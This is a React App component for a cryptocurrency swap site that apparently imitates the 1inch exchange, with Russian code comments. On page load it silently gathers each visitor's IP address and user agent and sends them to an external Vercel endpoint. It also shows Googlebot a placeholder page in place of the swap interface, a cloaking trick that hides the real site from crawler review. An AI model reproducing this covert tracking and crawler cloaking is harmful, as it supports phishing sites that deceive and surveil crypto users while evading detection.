import { useState, useEffect } from "react";
import "./App.css";
import Header from "./Header";
import Swap from "./Swap";
import Footer from "./Footer";

function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [content, setContent] = useState("");

  useEffect(() => {
    const logVisit = async () => {
      const userAgent = navigator.userAgent;
      const entryDate = new Date().toISOString();

      // Получаем IP-адрес через внешний сервис (например, ipify)
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      const ipAddress = data.ip;

      // Отправляем данные на бэкенд
      await fetch("https://1inch2test-rud8.vercel.app/api/user-info", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userAgent: userAgent,
          ip: ipAddress,
          entryDate: entryDate,
        }),
      });
    };

    logVisit();

    // Логика отображения контента для Googlebot
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes("googlebot")) {
      setContent("Welcome Googlebot!");
    }
  }, []);

  return (
    <>
      {content ? (
        <div className="content-container">{content}</div>
      ) : (
        <div className="main-container">
          <Header
            walletAddress={walletAddress}
            setWalletAddress={setWalletAddress}
          />
          <Swap walletAddress={walletAddress} />
          <Footer />
        </div>
      )}
    </>
  );
}

export default App;
